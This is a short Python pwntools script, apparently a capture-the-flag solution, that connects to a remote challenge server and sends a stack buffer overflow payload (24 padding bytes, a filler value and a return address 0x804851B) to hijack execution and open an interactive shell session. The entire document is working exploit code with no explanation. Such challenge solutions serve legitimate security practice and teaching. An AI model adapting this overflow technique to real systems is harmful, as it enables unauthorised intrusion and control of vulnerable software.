from pwn import *
# io = process('./pwn')
io = remote('node4.buuoj.cn', 29015)
io.sendline(cyclic(24) + p32(0xdeadbeef) + p32(0x804851B))
io.interactive()
